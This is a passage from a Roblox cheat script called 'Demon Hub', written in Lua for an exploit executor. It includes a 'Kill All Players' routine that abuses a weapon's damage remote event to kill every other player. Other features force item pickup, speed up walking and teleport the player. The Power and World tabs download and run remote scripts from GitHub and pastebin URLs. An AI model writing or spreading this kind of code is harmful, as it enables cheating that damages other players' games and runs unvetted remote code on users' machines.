                                    if touchTransmitter then
                                        firetouchinterest(root, handle, 0)
                                        task.wait(0.05)
                                        firetouchinterest(root, handle, 1)
                                    else
                                        -- Method 2: Direct parenting (backup)
                                        if obj.Parent == Workspace then
                                            obj.Parent = LocalPlayer.Backpack
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end
            end
        end)
    end
end)

-- ════════════════ 13.2 AUTO DROP TOOLS ════════════════
local function dropAllTools()
    if not Character or not Humanoid or Humanoid.Health <= 0 then return end
    
    -- Drop equipped tools
    local equippedTool = Character:FindFirstChildOfClass("Tool")
    if equippedTool then
        pcall(function()
            equippedTool.CanBeDropped = true
            equippedTool.Parent = Workspace
            equippedTool.Handle.CFrame = Character.HumanoidRootPart.CFrame + Vector3.new(0, -3, 0)
        end)
    end
    
    -- Drop backpack tools
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            pcall(function()
                tool.CanBeDropped = true
                tool.Parent = Character
                wait(0.1)
                tool.Parent = Workspace
                if tool:FindFirstChild("Handle") then
                    tool.Handle.CFrame = Character.HumanoidRootPart.CFrame + Vector3.new(math.random(-5, 5), -3, math.random(-5, 5))
                end
            end)
        end
    end
end

Tabs.Toggles:Toggle("Auto Drop Tools", false, function(state)
    States.AutoDropTools = state
    
    -- Clean up existing connection
    if Connections.AutoDropTools then
        Connections.AutoDropTools:Disconnect()
        Connections.AutoDropTools = nil
    end
    
    if state then
        -- Drop tools every 0.5 seconds
        Connections.AutoDropTools = RunService.Heartbeat:Connect(function()
            if not States.AutoDropTools then return end
            if tick() % 0.5 < 0.016 then -- Execute roughly every 0.5 seconds
                dropAllTools()
            end
        end)
    end
end)

-- ════════════════ 13.3 KILL ALL PLAYERS ════════════════
local function attemptKillAll()
    if not Character or not Humanoid or Humanoid.Health <= 0 then return end
    
    local myRoot = Character:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    
    -- Find sword tool
    local sword = Character:FindFirstChildOfClass("Tool") or LocalPlayer.Backpack:FindFirstChild("sword")
    if not sword then
        -- Try to find any tool with "sword" in the name
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:lower():find("sword") then
                sword = tool
                break
            end
        end
    end
    
    if not sword then return end
    
    -- Equip the sword if not equipped
    if sword.Parent ~= Character then
        Utils.SafeExecute(function()
            Humanoid:EquipTool(sword)
        end)
        wait(0.1) -- Wait for equip
    end
    
    -- Try multiple methods to find the damage remote
    local remote = nil
    
    -- Method 1: Standard path
    local handle = sword:FindFirstChild("Handle")
    if handle then
        local dmgPart = handle:FindFirstChild("dmg")
        if dmgPart then
            remote = dmgPart:FindFirstChild("RemoteEvent")
        end
        
        -- Method 2: Direct child of handle
        if not remote then
            remote = handle:FindFirstChild("RemoteEvent")
        end
    end
    
    -- Method 3: Search all descendants
    if not remote then
        for _, desc in ipairs(sword:GetDescendants()) do
            if desc:IsA("RemoteEvent") then
                remote = desc
                break
            end
        end
    end
    
    if not remote then return end
    
    -- Attack all players
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
            local targetHum = player.Character:FindFirstChildOfClass("Humanoid")
            
            if targetRoot and targetHum and targetHum.Health > 0 then
                local distance = (myRoot.Position - targetRoot.Position).Magnitude
                
                -- Only attack if within reasonable range
                if distance < 500 then
                    Utils.SafeExecute(function()
                        -- Try multiple damage values
                        remote:FireServer(targetHum, math.huge)
                        remote:FireServer(targetHum, 999999999)
                        remote:FireServer(targetHum, targetHum.MaxHealth)
                        
                        -- Some games use different arguments
                        remote:FireServer(targetHum)
                        remote:FireServer(player.Character)
                    end)
                end
            end
        end
    end
end

Tabs.Toggles:Toggle("Kill All Players", false, function(state)
    States.KillAll = state
    
    -- Clean up existing connection
    if Connections.KillAll then
        Connections.KillAll:Disconnect()
        Connections.KillAll = nil
    end
    
    if state then
        Connections.KillAll = RunService.Heartbeat:Connect(function()
            if not States.KillAll then return end
            attemptKillAll()
        end)
    end
end)

-- ════════════════ CLEANUP ON CHARACTER REMOVAL ════════════════
LocalPlayer.CharacterRemoving:Connect(function()
    -- Disconnect all connections
    for name, connection in pairs(Connections) do
        if connection then
            connection:Disconnect()
            Connections[name] = nil
        end
    end
    
    -- Reset all states
    for name, _ in pairs(States) do
        States[name] = false
    end
end)

    -- 13.4 Loop Walk Speed
    Tabs.Toggles:Toggle("Lock Walk Speed (100)", false, function(state)
        States.WalkSpeedLoop = state
        
        if Connections.WalkSpeedLoop then
            Connections.WalkSpeedLoop:Disconnect()
            Connections.WalkSpeedLoop = nil
        end
        
        if state then
            Connections.WalkSpeedLoop = task.spawn(function()
                while States.WalkSpeedLoop do
                    local hum = Utils.GetHumanoid()
                    if hum then
                        hum.WalkSpeed = 100
                    end
                    task.wait()
                end
            end)
        end
    end)


-- ════════════════ [14] UI MODIFICATIONS ════════════════
if Tabs.UI then
    Tabs.UI:Button("Remove All Pass GUIs", function()
        local function destroyEffectsUI()
            for _, gui in ipairs({Services.StarterGui, LocalPlayer:WaitForChild("PlayerGui")}) do
                local passes = gui:FindFirstChild("passes")
                if passes then
                    for _, child in ipairs(passes:GetChildren()) do
                        if child:IsA("Frame") or child:IsA("TextButton") then
                            Utils.SafeExecute(function()
                                child:Destroy()
                            end)
                        end
                    end
                end
            end
        end
        
        destroyEffectsUI()
        
        LocalPlayer.CharacterAdded:Connect(function()
            task.wait(1)
            destroyEffectsUI()
        end)
        
        Utils.Notify("UI", "Effects GUI removed permanently", 3)
    end)
end

-- ════════════════ [15] TELEPORTATION SYSTEM ════════════════
if Tabs.Teleports then
    local TeleportLocations = {
        {name = "Arena", cframe = CFrame.new(-18.393, 26.978, 9.003, 0.999929, 0, 0.011914, 0, 1, 0, -0.011914, 0, 0.999929)},
        {name = "Tree", cframe = CFrame.new(-143.156, 82.464, -246.582, 0.985673, 0, -0.168666, 0, 1, 0, 0.168666, 0, 0.985673)},
        {name = "Wall", cframe = CFrame.new(-251.617, 92.690, -335.043, -0.794003, 0, -0.607913, 0, 1, 0, 0.607913, 0, -0.794003)},
        {name = "Gray Wall", cframe = CFrame.new(-266.613, 119.881, -347.056, -0.698223, 0, -0.715880, 0, 1, 0, 0.715880, 0, -0.698223)},
        {name = "Secret Area", cframe = CFrame.new(-197.105, 22.953, -377.287) * CFrame.Angles(math.rad(0.044), math.rad(23.156), math.rad(0.08))},
        {name = "Outside", cframe = CFrame.new(-295.778, 25.596, -355.215, -0.409, 0, -0.913, 0, 1, 0, 0.913, 0, -0.409)},
        {name = "Gate Exterior", cframe = CFrame.new(-420.443, 25.596, -9.648, -0.0046, 0, -0.999989, 0, 1, 0, 0.999989, 0, -0.0046)},
        {name = "Rock Interior 1", cframe = CFrame.new(-341.302, 25.596, 47.305, 0.342859, 0, 0.939387, 0, 1, 0, -0.939387, 0, 0.342859)},
        {name = "Pillar Top", cframe = CFrame.new(-88.647, 70.197, 92.618, 0.952380, 0, -0.304915, 0, 1, 0, 0.304915, 0, 0.952380)},
        {name = "Underground", cframe = CFrame.new(45.779, 21.812, -185.381, -0.863430, -0.497, -0.087601, 0, 0.173651, -0.984807, 0.504468, -0.850312, -0.149936)}
    }

    for _, location in ipairs(TeleportLocations) do
        Tabs.Teleports:Button(location.name, function()
            local root = Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = location.cframe
                Utils.Notify("Teleport", "Teleported to " .. location.name, 2)
            end
        end)
    end

    Tabs.Teleports:Button("Set Teleport Keybinds", function()
        Utils.Notify("Teleport", "Press 1-5 for quick teleports", 3)
        
        Services.UserInputService.InputBegan:Connect(function(input, processed)
            if processed then return end
            
            local keyMap = {
                [Enum.KeyCode.One] = 1,
                [Enum.KeyCode.Two] = 2,
                [Enum.KeyCode.Three] = 3,
                [Enum.KeyCode.Four] = 4,
                [Enum.KeyCode.Five] = 5
            }
            
            local index = keyMap[input.KeyCode]
            if index and TeleportLocations[index] then
                local root = Character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.CFrame = TeleportLocations[index].cframe
                    Utils.Notify("Quick TP", "Teleported to " .. TeleportLocations[index].name, 1)
                end
            end
        end)
    end)
end

-- ════════════════ [16] POWER SYSTEM ════════════════
if Tabs.Power then
    local powerScripts = {
        {name = "1K Power (3s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/1K"},
        {name = "2K Power (6s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/2K"},
        {name = "5K Power (10s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/5K"},
        {name = "10K Power (20s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/10K"}
    }

    for _, script in ipairs(powerScripts) do
        Tabs.Power:Button(script.name, function()
            Utils.LoadScript(script.url)
        end)
    end

    -- Additional tool for monitoring power stats
    Tabs.Power:Button("Power Stats Viewer", function()
        Utils.LoadScript("https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/SECURITY.md")
    end)
end

-- ════════════════ [17] WORLD TELEPORTS ════════════════
if Tabs.Worlds then
    local worldScripts = {
        {name = "Coffee Shop", url = "https://pastebin.com/raw/Pvj5Ckc2"},
        {name = "Clockwork Arena", url = "https://pastebin.com/raw/NNp1NJKT"},
        {name = "Shipment", url = "https://pastebin.com/raw/J3Jk3NaC"},
        {name = "Purple Battlefields", url = "https://pastebin.com/raw/kdg5tmdg"},
        {name = "Lock Shift", url = "https://raw.githubusercontent.com/MiniNoobie/ShiftLockx/main/Shiftlock-MiniNoobie"}
    }

    for _, world in ipairs(worldScripts) do
        Tabs.Worlds:Button(world.name, function()
            Utils.LoadScript(world.url)
        end)
    end
end


-- ════════════════ ENHANCED NOTIFICATION SYSTEM ════════════════
local NotificationQueue = {
    queue = {},
    isProcessing = false,
    maxQueue = 10
}

local function processNotificationQueue()
    if NotificationQueue.isProcessing or #NotificationQueue.queue == 0 then
        return
    end
    
    NotificationQueue.isProcessing = true
    
    task.spawn(function()
        while #NotificationQueue.queue > 0 do
            local notification = table.remove(NotificationQueue.queue, 1)
            
            local success = pcall(function()
                -- Try StarterGui notification first
                if game:GetService("StarterGui") then
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = notification.title;
                        Text = notification.message;
                        Duration = notification.duration or 3;
                        Button1 = "OK";
                    })
                end
            end)
            
            if not success then
                -- Fallback: Print to console
                print("[" .. notification.title .. "] " .. notification.message)
            end
            
            -- Wait between notifications to prevent overlap
            task.wait(0.5)
        end
        
        NotificationQueue.isProcessing = false
    end)
end

local function queueNotification(title, message, duration)
    -- Prevent queue overflow
    if #NotificationQueue.queue >= NotificationQueue.maxQueue then
        table.remove(NotificationQueue.queue, 1) -- Remove oldest
    end
    
    table.insert(NotificationQueue.queue, {
        title = title,
        message = message,
        duration = duration or 3
    })
    
    processNotificationQueue()
end

-- Enhanced Utils.Notify function
if not Utils then Utils = {} end
Utils.Notify = function(title, message, duration)
    queueNotification(title, message, duration)
end

-- ════════════════ [18] ENHANCED MUSIC PLAYER ════════════════
local MusicPlayer = {
    CurrentSong = nil,
    Volume = 1,
    Songs = {
        {name = "Save Me", id = "128972545110914"},
        {name = "Rootkit", id = "5410081542"},
        {name = "Say So - Doja Cat", id = "1840036018"},
        {name = "The Future", id = "1837358800"},
        {name = "Feel Your Heart", id = "5410082171"},
        {name = "Forward", id = "5410081471"},
        {name = "No Sleep", id = "7029011778"},
        {name = "Pixel Terror", id = "5410080475"},
        {name = "Labyrinth", id = "7023690024"},
        {name = "All I Want", id = "7023680426"},
        {name = "Sacrified", id = "125847822956321"},
        {name = "Colors", id = "5410086062"},
        {name = "You Used To", id = "7023720291"},
        {name = "Rock Star", id = "108319978126931"},
        {name = "Coral Sea", id = "1839253629"},
        {name = "King", id = "1840030788"},
        {name = "Chasing Clouds", id = "5410082097"},
        {name = "Pendulum", id = "1843384804"},
        {name = "She Make Me", id = "1841807265"},
        {name = "I'm So Alone", id = "6774872457"},
        {name = "Hate Me", id = "6873260626"},
        {name = "Safe & Sound", id = "7024233823"},
        {name = "Dreamers", id = "7029083554"},
        {name = "Internet Boy", id = "5410084870"},
        {name = "Let's Play", id = "5410085763"},
        {name = "Night", id = "1836879421"},
        {name = "Pull Over", id = "1839983980"},
        {name = "WRLD - Hang Up", id = "5410084188"},
        {name = "Deja Vu", id = "6781116057"},
        {name = "Give The World", id = "1836778353"},
        {name = "Top Of The World", id = "1836847994"},
        {name = "Siren", id = "1840056866"},
        {name = "Overtime", id = "1842019862"},
        {name = "Hours", id = "7028932563"},
        {name = "Weekend Vibes", id = "1837083064"},
        {name = "Glacier", id = "7023760529"},
        {name = "Only You", id = "7024028859"},
        {name = "Hyper", id = "7023887630"},
        {name = "Play Cool", id = "7029017448"},
        {name = "What It's Like", id = "7028997537"},
        {name = "New World", id = "5410082346"},
        {name = "You Take Me", id = "7029070008"},
        {name = "Thinking About You", id = "7023445033"},
        {name = "Oopsy", id = "115877769571526"},
        {name = "I won't go", id = "5410082273"},
        {name = "Gurber beats", id = "121881213314227"},
        {name = "Night Owl", id = "1843391637"},
        {name = "Coming Soon!", id = ""}
    }
}

-- Enhanced music functions
local function stopAllSounds()
    pcall(function()
        if MusicPlayer.CurrentSong then
            MusicPlayer.CurrentSong:Stop()
            MusicPlayer.CurrentSong:Destroy()
            MusicPlayer.CurrentSong = nil
        end

        local soundContainers = {
            game:GetService("SoundService"),
            workspace,
            game:GetService("Lighting"),
            game:GetService("ReplicatedStorage"),
            game:GetService("Players"),
            game:GetService("StarterGui"),
            game:GetService("StarterPack")
        }

        for _, container in pairs(soundContainers) do
            for _, descendant in pairs(container:GetDescendants()) do
                if descendant:IsA("Sound") then
                    pcall(function()
                        descendant:Stop()
                        descendant:Destroy()
                    end)
                end
            end
        end
    end)
end

local function playSong(songName, soundId)
    if soundId == "" or not soundId then
        Utils.Notify("Music", "Song not available yet!", 2)
        return
    end
    
    pcall(function()
        -- Stop current song
        if MusicPlayer.CurrentSong then
            MusicPlayer.CurrentSong:Stop()
            MusicPlayer.CurrentSong:Destroy()
        end
        
        -- Create new sound
        MusicPlayer.CurrentSong = Instance.new("Sound")
        MusicPlayer.CurrentSong.SoundId = "rbxassetid://" .. soundId
        MusicPlayer.CurrentSong.Volume = MusicPlayer.Volume
        MusicPlayer.CurrentSong.Looped = true
        MusicPlayer.CurrentSong.Parent = game:GetService("SoundService")
        
        -- Play with error handling
        local success = pcall(function()
            MusicPlayer.CurrentSong:Play()
        end)
        
        if success then
            Utils.Notify("Music", "Now playing: " .. songName, 3)
        else
            Utils.Notify("Music", "Failed to play: " .. songName, 3)
        end
    end)
end

if Tabs and Tabs.Music then
    -- Music Controls
    Tabs.Music:Button("Stop All Music", function()
        stopAllSounds()
        Utils.Notify("Music", "All music stopped.", 2)
    end)

    -- Volume Control
    Tabs.Music:Slider("Volume", 0, 100, 50, function(value)
        MusicPlayer.Volume = value / 100
        if MusicPlayer.CurrentSong then
            MusicPlayer.CurrentSong.Volume = MusicPlayer.Volume
        end
        Utils.Notify("Music", "Volume: " .. value .. "%", 1)
    end)

    -- Create song buttons
    for _, song in ipairs(MusicPlayer.Songs) do
        if song.id ~= "" then -- Only create buttons for available songs
            Tabs.Music:Button(song.name, function()
                playSong(song.name, song.id)
            end)
        end
    end
end

-- ════════════════ [19] SETTINGS & CLEANUP ════════════════
if Tabs and Tabs.Settings then
    -- Enhanced Settings Manager
    local SettingsManager = {
        AutoSave = true,
        BackupCount = 0
    }
    
    -- Services
    local Services = {
        Players = game:GetService("Players"),
        TeleportService = game:GetService("TeleportService"),
        HttpService = game:GetService("HttpService"),
        UserInputService = game:GetService("UserInputService")
    }
    
    local LocalPlayer = Services.Players.LocalPlayer
      
    -- Auto-reconnect
    Tabs.Settings:Toggle("Auto Reconnect", false, function(state)
        if state then
            LocalPlayer.OnTeleport:Connect(function(teleportState)
                if teleportState == Enum.TeleportState.Failed then
                    Utils.Notify("Reconnect", "⚠Teleport failed, attempting reconnect...", 5)
                    pcall(function()
                        Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
                    end)
                end
            end)
            Utils.Notify("Settings", "Auto reconnect enabled", 2)
        else
            Utils.Notify("Settings", "Auto-reconnect disabled", 2)
        end
    end)

    -- Discord
    Tabs.Settings:Button("Join Discord", function()
        local discordInvite = "https://discord.com/invite/J7AYrApFAH"
        
        local success = pcall(function()
            if setclipboard then
                setclipboard(discordInvite)
                return true
            end
            return false
        end)
        
        if success then
            Utils.Notify("Discord", "Discord invite copied to clipboard!", 3)
        else
            Utils.Notify("Discord", "Failed to copy. Link: " .. discordInvite, 5)
        end
    end)

    -- Save/Load Settings
    local function saveSettings()
        if not writefile then
            Utils.Notify("Settings", "File system not available", 2)
            return
        end
        
        local config = {
            WalkSpeed = Movement and Movement.WalkSpeed or 16,
            JumpPower = Movement and Movement.JumpPower or 50,
            States = States or {},
            Volume = MusicPlayer.Volume,
            LastSaved = os.time(),
            Version = "2025"
        }
        
        local success = pcall(function()
            local configString = Services.HttpService:JSONEncode(config)
            writefile("DemonHubSettings.json", configString)
        end)
        
        if success then
            Utils.Notify("Settings", "Settings saved successfully", 2)
        else
            Utils.Notify("Settings", "Failed to save settings", 2)
        end
    end
    
    local function loadSettings()
        if not readfile or not isfile then
            Utils.Notify("Settings", "File system not available", 2)
            return
        end
        
        if not isfile("DemonHubSettings.json") then
            Utils.Notify("Settings", "No saved settings found", 2)
            return
        end
        
        local success = pcall(function()
            local configString = readfile("DemonHubSettings.json")
            local config = Services.HttpService:JSONDecode(configString)
            
            if config.WalkSpeed and Movement then Movement.WalkSpeed = config.WalkSpeed end
            if config.JumpPower and Movement then Movement.JumpPower = config.JumpPower end
            if config.Volume then MusicPlayer.Volume = config.Volume end
            if config.States and States then
                for key, value in pairs(config.States) do
                    States[key] = value
                end
            end
        end)
        
        if success then
            Utils.Notify("Settings", "Settings loaded successfully", 2)
        else
            Utils.Notify("Settings", "Failed to load settings", 2)
        end
    end

    Tabs.Settings:Button("Save Settings", saveSettings)
    Tabs.Settings:Button("Load Settings", loadSettings)

    -- Enhanced Reset
    local resetConfirmation = false
    Tabs.Settings:Button("Reset Everything", function()
        if not resetConfirmation then
            resetConfirmation = true
            Utils.Notify("Reset", "Click again within 5 seconds to confirm COMPLETE RESET", 5)
            
            task.spawn(function()
                task.wait(5)
                resetConfirmation = false
                Utils.Notify("Reset", "Reset cancelled", 1)
            end)
            return
        end
        
        pcall(function()
            -- Disconnect all connections
            if Connections then
                for name, connection in pairs(Connections) do
                    if connection then
                        if typeof(connection) == "RBXScriptConnection" then
                            connection:Disconnect()
                        else
                            task.cancel(connection)
                        end
                    end
                end
                Connections = {}
            end
            
            -- Reset states
            if States then
                for key in pairs(States) do
                    States[key] = false
                end
            end
            
            -- Stop music
            stopAllSounds()
            
            -- Reset movement
            if Movement then
                Movement.WalkSpeed = 16
                Movement.JumpPower = 50
            end
            
            local character = LocalPlayer.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.WalkSpeed = 16
                    humanoid.JumpPower = 50
                end
            end
        end)
        
        resetConfirmation = false
        Utils.Notify("Reset", "Everything reset successfully", 3)
    end)

    -- Credits
    Tabs.Settings:Button("Credits", function()
        Utils.Notify("Credits", "created by Alzn • Fixed by xc3vh", 4)
    end)
end

-- UI Toggle (Right Ctrl key)
local function setupUIToggle()
    pcall(function()
        local CoreGui = game:GetService("CoreGui")
        local UserInputService = game:GetService("UserInputService")
        
        UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == Enum.KeyCode.RightControl then
                -- Try to find the main UI
                local mainUI = CoreGui:FindFirstChild("Discord") or CoreGui:FindFirstChild("MainUI")
                if mainUI then
                    if mainUI:IsA("ScreenGui") then
                        mainUI.Enabled = not mainUI.Enabled
                        Utils.Notify("UI", mainUI.Enabled and "UI Shown" or "UI Hidden", 1)
                    else
                        mainUI.Visible = not mainUI.Visible
                        Utils.Notify("UI", mainUI.Visible and "UI Shown" or "UI Hidden", 1)
                    end
                end
            end
        end)
    end)
end

-- Setup UI toggle after a delay
task.wait(1)
setupUIToggle()
print([[
╭────────────────────────────────────────────────────────────────────────────╮
│                                                                            │
│    ██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗    ██╗  ██╗██╗   ██╗██████╗ │
│    ██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║    ██║  ██║██║   ██║██╔══██╗│
│    ██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║    ███████║██║   ██║██████╔╝│
│    ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║    ██╔══██║██║   ██║██╔══██╗│
│    ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║    ██║  ██║╚██████╔╝██████╔╝│
│    ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ │
│                                                                            │
│                  ░▒▓█ DEMON HUB — 2025 CORRUPT EDITION █▓▒░                │
│                          ⚡ System Loaded Successfully ⚡                   │
│                                                                            │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│     🔧 FIXES & IMPROVEMENTS:                                               │
│   ┌──────────────────────────────────────────────────────────────────────┐ │
│   │ ✅ Notifications now reliably fallback if needed                     │ │
│   │ ✅ Error handling system improved across modules                     │ │
│   │ ✅ Music player refined with active status display                   │ │
│   │ ✅ Settings panel now loads faster and cleaner                       │ │
│   │ ✅ UI toggle bug patched                                             │ │
│   │ ✅ Visual feedback added to major actions                            │ │
│   └──────────────────────────────────────────────────────────────────────┘ │
│                                                                            │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│                    ⬇️  Press [Right Ctrl] to toggle the interface             │
│                                                                            │
│        ░▒▓█ STATUS: ONLINE █▓▒░    ░▒▓█ MODE: CORRUPT █▓▒░                │
│                                                                            │
╰────────────────────────────────────────────────────────────────────────────╯
]])
-- ═══════════════ END OF DEMON HUB 2025 FIXED EDITION ═══════════════
